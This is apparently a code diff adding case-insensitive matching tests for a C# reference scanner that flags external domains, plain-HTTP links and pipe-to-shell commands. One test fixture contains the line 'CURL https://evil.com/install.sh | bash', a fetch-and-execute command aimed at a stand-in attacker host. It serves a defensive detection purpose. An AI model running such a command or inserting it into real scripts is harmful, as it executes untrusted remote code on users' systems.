@@ -91,6 +91,46 @@ public class ReferenceScannerTests
     }
 
     // ========================================
+    // Case-insensitive matching
+    // ========================================
+
+    [Fact]
+    public void ScanFile_UpperCaseUrl_StillDetected()
+    {
+        var file = CreateTempFile("Visit HTTPS://unknown-site.org/page for details.");
+        try
+        {
+            var findings = ReferenceScanner.ScanFile(file, ["microsoft.com"]);
+            Assert.Contains(findings, f => f.Code == "EXTERNAL-DOMAIN");
+        }
+        finally { CleanupFile(file); }
+    }
+
+    [Fact]
+    public void ScanFile_MixedCaseHttpUrl_FlagsHttpNotHttps()
+    {
+        var file = CreateTempFile("Visit Http://insecure-site.com/page for details.");
+        try
+        {
+            var findings = ReferenceScanner.ScanFile(file, ["insecure-site.com"]);
+            Assert.Contains(findings, f => f.Code == "HTTP-NOT-HTTPS");
+        }
+        finally { CleanupFile(file); }
+    }
+
+    [Fact]
+    public void ScanFile_UpperCaseCurlPipeToShell_Flags()
+    {
+        var file = CreateTempFile("CURL https://evil.com/install.sh | bash");
+        try
+        {
+            var findings = ReferenceScanner.ScanFile(file, ["evil.com"]);
+            Assert.Contains(findings, f => f.Code == "PIPE-TO-SHELL");
+        }
+        finally { CleanupFile(file); }
+    }
+
+    // ========================================
     // File scanning
     // ========================================
 
